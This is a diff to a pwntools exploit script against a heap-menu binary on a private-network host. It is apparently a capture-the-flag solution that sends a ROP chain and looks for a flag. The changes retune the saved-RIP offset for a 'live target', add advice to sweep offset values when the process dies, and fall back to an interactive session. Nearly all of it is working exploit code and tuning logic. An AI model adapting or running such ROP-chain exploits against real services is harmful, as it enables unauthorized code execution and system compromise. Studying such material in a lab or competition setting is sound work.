@@ -39,7 +39,7 @@ context.log_level = os.environ.get("LL", "info")
 
 HOST = os.environ.get("HOST", "172.16.38.22")
 PORT = int(os.environ.get("PORT", "6656"))
-OFF  = int(os.environ.get("OFF", "0x38"), 16)   # saved_rip - OFF   (0x38 = fix)
+OFF  = int(os.environ.get("OFF", "0x28"), 16)   # saved_rip - OFF (0x28 reaches the read on the live target; sweep if needed)
 
 def start():
     if args.REMOTE:
@@ -228,7 +228,13 @@ def main():
 
     log.success("sending final ROP chain")
     choose("Add a node"); io.recvuntil(b"Size?"); io.sendline(str(0xe8).encode())
-    io.recvuntil(b"Data?", timeout=5)
+    r = io.recvuntil(b"Data?", timeout=5)
+    if b"Data?" not in r:
+        # Died before the read -> this OFF isn't reaching the allocation on this
+        # target's frame layout. Tells us to change OFF, not the chain.
+        log.failure(f"process died before 'Data?' at OFF={hex(OFF)} (final malloc "
+                    f"didn't land). Try: OFF=0x28 / 0x38 / 0x48 python3 %s REMOTE" % sys.argv[0])
+        return
     io.send(bytes(data))         # add() prints Success, then returns into the chain
 
     out = io.recvrepeat(2)
@@ -237,7 +243,8 @@ def main():
     if m:
         log.success("FLAG: " + m.group().decode())
     else:
-        log.info("no flag captured; dropping to interactive")
+        log.warning(f"reached the read at OFF={hex(OFF)} but no flag -> chain landed "
+                    f"slightly off; nudge OFF by +/-0x10 or send me this run's output")
         io.interactive()
 
 if __name__ == "__main__":
